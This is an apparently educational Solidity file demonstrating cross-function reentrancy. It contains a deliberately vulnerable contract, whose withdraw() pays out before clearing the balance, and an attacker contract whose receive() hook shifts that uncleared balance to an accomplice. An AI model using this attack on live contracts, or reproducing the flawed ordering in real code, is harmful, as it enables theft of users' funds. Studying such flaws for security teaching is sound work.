// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

/**
 * @notice type 2 CROSS-FUNCTION REENTRANCY
 *
 * see contract #25 Reentrancy Ether for type 1
 *
 * Exploits: a vulnerable function within a contract shares the state (balances)
 * with another function that benefits the attacker (transfer)
 *
 * Result: the attacker gets his money back but in the meantime
 * it also assign the balance value to its accomplice
 *
 *
 * @notice type 3 CROSS-CONTRACT REENTRANCY
 * NOTE send() and transfer() are safe against reentrancy
 */

contract ReentrancyVictim {
    error ReentrancyVictim_balanceIsLow();
    error ReentrancyVictim_callFailed();

    mapping(address => uint256) public balances;
    uint256 public currentBalance;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function transfer(address to, uint256 amount) external {
        // double spending
        if (balances[msg.sender] >= amount) {
            //1 ether
            //sender is the attacker
            //it's still 1 ether, balances has not been updated yet!
            balances[msg.sender] -= amount; // attacker has 0 ether
            balances[to] += amount; // attacker has 1 ether
        }
    }

    /**
     * Identical as in contract 25
     */
    function withdraw() public {
        uint256 userBalance = balances[msg.sender];
        // 1) Check
        if (userBalance == 0) {
            revert ReentrancyVictim_balanceIsLow();
        }
        // 2) Interacion
        (bool success,) = msg.sender.call{value: userBalance}(""); //this triggers the fallback function in the receiver
        if (!success) {
            revert ReentrancyVictim_callFailed();
        }
        // 3) Effect
        balances[msg.sender] = 0;
    }

    function getBalances(address user) public view returns (uint256) {
        return balances[user];
    }
}

contract ReentrancyAttacker {
    ReentrancyVictim immutable victim;
    address immutable accomplice;

    error ReentrancyAttacker_sendingNotEnoughEthers();

    constructor(address _victim, address _accomplice) {
        victim = ReentrancyVictim(_victim);
        accomplice = _accomplice;
    }

    function attack() external payable {
        if (
            msg.value < 1 ether //
        ) revert ReentrancyAttacker_sendingNotEnoughEthers();
        victim.deposit{value: msg.value}();
        victim.withdraw(); // calls a receive / fallback
    }

    receive() external payable {
        if (address(victim).balance >= msg.value) {
            victim.transfer(accomplice, 1 ether);
        }
    }
}
